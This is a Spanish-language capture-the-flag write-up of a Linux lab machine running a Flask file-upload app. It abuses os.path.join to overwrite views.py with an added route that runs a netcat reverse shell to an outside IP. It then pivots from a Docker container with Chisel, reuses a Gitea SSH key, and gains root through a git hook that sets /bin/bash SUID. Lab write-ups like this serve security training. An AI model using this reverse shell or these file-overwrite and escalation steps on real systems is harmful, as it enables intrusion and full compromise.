
---
- Tags: #git #LFI #pivoting #Docker #Medium 
- ---
#### QUÉ SE EXPLOTA?

Web Enumeration Github Project Enumeration Information Leakage Abusing File Upload - Replacing Python Files [[LFI]] Shell via Flask Debug - Playing with Chisel - remote [[Port Forwarding]] Abusing Gitea + Information Leakage Abusing Cron Job + Git Hooks 

#### Write UP:

##### PRIMER FASE: Escaneos

Empezamos lanzando nuestros escaneos por defecto con nmap como usualmente lo hacemos. En Primeramente empezamos lanzando un escaneo **-sS** y para encontrar todos los puertos abiertos

Posteriormente lanzamos un escaneo más detallado de los puertos encontrados. Para ver un poco más contra que nos estamos enfrentando. 

![[Pasted image 20251017072828.png]]

Los puertos encontrados fueron SSH (22) y HTTP(80) por lo que, proseguimos a inspeccionar el sitio web, ya que bueno, no encontramos nada muy relevante. 

El sitio web parece ser de algun software de almacenamiento y carga de archivos, de hecho, viene una prueba para montar en un Docker. Además también vienen los archivos de configuración.

Le echamos un vistazo a la descarga del software descomprimiendolo con...

```bash
7z x nombre_dearchivo
```

![[Pasted image 20251017073138.png]]
Encontramos un proyecto [[git]] por lo que empezamos a ver los commits que hay, pero, nada de mucha utilidad. Además descubrimos que hay una branch...

```bash
git branch
```
![[Pasted image 20251017073333.png]]

Empezamos a ver los commits. Tanto de la rama public como de branch, en public no encontramos nada realmente útil, sin embargo en **dev**.
```bash
git log dev
```
Encontramos un commit con lo siguiente:
![[Pasted image 20251017073644.png]]

**dev01:Soulless_Developer#2022@10.10.10.128** es un usuario y contraseña. **En URL** podemos encontrar usuarios y contraseñas para conexiones representados usuario:contraseña@conexión:puerto

Guardamos esa info en un archivo donde iremos almacenando cosas que vayamos encontrando. 

Seguimos investigando pero, ya no encontramos nada relevante. **En la pagina había un botón que nos lleva a un panel para subir y guardar archivos**

Inspeccionamos ahora el software en sí, ya que nosotros descargamos el demo y dentro de **/app/app** encontramos el codigo ocupado para hacer las súbidas de archivos. 

![[Pasted image 20251017074525.png]]

Vemos el proceso de carga de archivo...
Lo primero que vemos es que la función para subir archivos lo hace mediante POST y además debe haber un parametro llamado **'file'** por el cual va llegar el nombre del archivo. Además vemos que se almacena en una variable **file_name** después de haber pasado por una función que se llama **get_file_name** que viene de **app.utils**

```python3
if request.method == 'POST'
	f = request.files['file']
	file_name = get_file_name(f.filename)
```
![[Pasted image 20251017074911.png]]

Revisando **utils.py** que también se encontraba en los archivos de configuración 
![[Pasted image 20251017075010.png]]

Encontramos la función. Lo que hace la función es **recibe el argumento en este caso "f.filename" (que es el nombre del archivo) y lo manda a otra función llamada *recursive_replace***

En la función **recursive_replace** 
![[Pasted image 20251017075241.png]]
**Recibe 3 argumentos**, en este caso **search** qué es el **unsafe_filename** que a su vez es el nombre de archivo que nosotros subimos. **replace_me** que es el **'../'**, y **with_me** que es **""** básicamente lo que dice la función es...

*Sí **replace_me** (../) no está en la busqueda entonces regresa el nombre del archivo, sino, regresa la función recursive_replace* 

```python3
return recursive_replace(search.replace(replace_me, with_me), replace_me, with_me)
```

**Todo esto fue fundamental para entender que entonces no podemos hacer [[Directory Path Traversal]] clásico con '../../../' ni con '....//....//....//'** 

Pero...

![[Pasted image 20251017081445.png]]

La ruta a donde se guarda utiliza **[[os.path.join()]]** .. en este caso **donde el script actual se está ejecutando(os.getcwd(),'public','uploads', 'file_name'**   

**En *os.path.join* Si algún argumento empieza con "/", todo lo anterior se descarta y se toma esa ruta como raíz absoluta** 

##### SEGUNDA FASE: Explotación

Tras haber inspeccionado el archivo descargado, proseguimos a seguir en la página web. Encontramos un panel donde podemos subir archivos y lo probamos subiendo un **.php** para ver si ejecutaba en sistema algún comando. 

![[Pasted image 20251017085614.png]]

Al ir a la ruta, nos descargaba el **.php** por lo que no había ejecución a nivel sistema.

sabiendo lo que sabíamos sobre el funcionamiento de la pagina. Intentamos reemplazar el archivo **views.py** que estaba almacenado en **/app/app/**. 

Con [[Burpsuite]] interceptamos la petición a la hora de subir el archivo para ver como funciona la petición. 

![[Pasted image 20251017085935.png]]

ahí encontramos el campo file y filename. **Como ya sabemos no podemos poner ../ por que lo elimina**
![[Pasted image 20251017090115.png]]

![[Pasted image 20251017090130.png]]

Pero, como usaba **os.path.join** si metemos **/app/app** nos debería permitir colar un archivo, por ejemplo en **/tmp.**

![[Pasted image 20251017090333.png]]

![[Pasted image 20251017090311.png]]

**Sabiendo esto, pasamos a modificar el archivo views.py, para meterlo en la ruta /app/app/views.py y que se reemplaze el del servidor por el nuestro.** 

Copiamos el views.py del proyecto que descargamos, y lo modificamos copiando y pegando una de las funciones del mismo archivo y modificandola. 

de manera que ahora nos queda:

```python3
   1   │ import os
   2   │ 
   3   │ from app.utils import get_file_name
   4   │ from flask import render_template, request, send_file
   5   │ 
   6   │ from app import app
   7   │ 
   8   │ 
   9   │ @app.route('/', methods=['GET', 'POST'])
  10   │ def upload_file():
  11   │     if request.method == 'POST':
  12   │         f = request.files['file']
  13   │         file_name = get_file_name(f.filename)
  14   │         file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)
  15   │         f.save(file_path)
  16   │         return render_template('success.html', file_url=request.host_url + "uploads/" + file_name)
  17   │     return render_template('upload.html')
  18   │ 
  19   │ 
  20   │ @app.route('/uploads/<path:path>')
  21   │ def send_report(path):
  22   │     path = get_file_name(path)
  23   │     return send_file(os.path.join(os.getcwd(), "public", "uploads", path))
  24   │#ESTO FUE LO QUE AGREGAMOS... COPIANDO LA FUNCIÓN DE ARRIBA
  25   │ @app.route('/rce')
  26   │ def revshell():
  27   │     return os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.6 443 >/tmp/f")
  
  ```

Ahora, cargamos el nuevo archivo en la sección de carga de la pagina, interceptamos la petición la modificamos por **/app/app/views.py** y en teoría al hacer curl a la pagina, y ponernos en escucha, deberíamos recibir la [[Reverse shell]]

![[Pasted image 20251017091101.png]]
![[Pasted image 20251017091123.png]]

![[Pasted image 20251017091140.png]]

![[Pasted image 20251017091708.png]]

##### TERCERA FASE: Post - Explotación

Estabilizamos la tty como de costumbre solo que con python ya que no había bash. y utilizamos sh
![[Pasted image 20251017091805.png]]

```bash
python3 -c 'import pty; pty.spawn("/bin/sh")'
```
![[Pasted image 20251017092115.png]]

Una vez dentro de la maquina verificamos la ruta donde estabamos, quien eramos y nuestra IP. Estabamos dentro de un contenedor [[Docker]]. 

![[Pasted image 20251017093250.png]]
Checamos el mapa, y vemos que para conexiones por fuera debemos pasar por el **gateway, 172.17.0.1** y además, con **ping** vimos que el host efectivamente está despierto. 

Primero intentamos conectarnos via **ssh** con las claves que anteriormente habíamos encontrado, pero, no funcionaron, nos pedía una **public_key**. 

Ahora vamos a hacer un script [[Scanner Puertos]]. Recordemos que no hay **/bin/bash** por lo que no podremos usar /dev/tcp. 

Proseguimos a usar [[NETCAT]] en su modo escaneo
```bash
nc 172.17.0.1 -nzv
```

-n : Omite resolución [[DNS]]
-z : Modo Escaneo
-v : Verbose (mostrar salida)

Teniendo eso creamos un pequeño script para ver que puertos están abiertos.
```bash
for port in $(seq 1 65535); do nc 172.17.0.1:$port -nzv; done
```

![[Pasted image 20251017113915.png]]

Vemos que el puerto 22 está abierto, además también vemos que el puerto **3000** y otros están abiertos. 

Nuevamente vamos a tirar otro escaneo con nmap. **En esta ocasión vamos a decirle que nos muestre todos los puertos**

![[Pasted image 20251017114246.png]]

Cómo podemos ver nos aparece el puerto 3000 como filtrado. **Probablemente haya algo en el puerto 3000 por lo que vamos a traernos el puerto 3000 a nuestra maquina utilizando [[Chisel]]** para aplicar [[Port Forwarding]]

![[Pasted image 20251017115008.png]]

![[Pasted image 20251017115048.png]]

exploramos ahora nuestro **localhost:6809** que en teoría es el puerto **3000** de la **172.17.0.1** Podemos ver que hay un panel de sign-in... 

Vamos a intentar a utilizar el usuario encontrado anteriormente. 

![[Pasted image 20251017115423.png]]

Intentamos Ingresar y lo logramos.

![[Pasted image 20251017115509.png]]


Vemos que hay 1 repositorio llamado backup... por lo que investigamos. Encontramos un **id_rsa** lo cuál significa que tenemos la llave para una ssh. La probamos y veamos si obtenemos acceso a la maquina original ya que el puerto **22** está abierto.
![[Pasted image 20251017120624.png]]

Nos copiamos la clave, le damos permisos y con esa misma tratamos de ingresar por **SSH**

![[Pasted image 20251017121507.png]]

Lo logramos.

###### PRIV ESC: [[Githooks]]

Ahora **tenemos que conseguir root** checamos con **sudo -l** pero, nos pedía contraseñas, buscamos binarios **SUID** pero no encontramos Nada. 

Nos creamos un pequeño escaner de procesos internos [[Scanner Procesos]]
**Se está ejecutando un script además de un *git push***

![[Pasted image 20251017130046.png]]

Además vemos que el creador de aquel script es root.

![[Pasted image 20251017130025.png]]

Sabiendo que se está ejecutando un **git push** a nivel root (**el creador del script es root)** podemos tratar de abusar de los [[Githooks]] 

![[Pasted image 20251017130419.png]]

Le damos permisos y monitoreamos a que cambien los permisos:
```bash
watch -n 1 ls -l /bin/bash
```

![[Pasted image 20251017130825.png]]

Ejecutamos **/bin/bash -p** y listo.

![[Pasted image 20251017130909.png]]










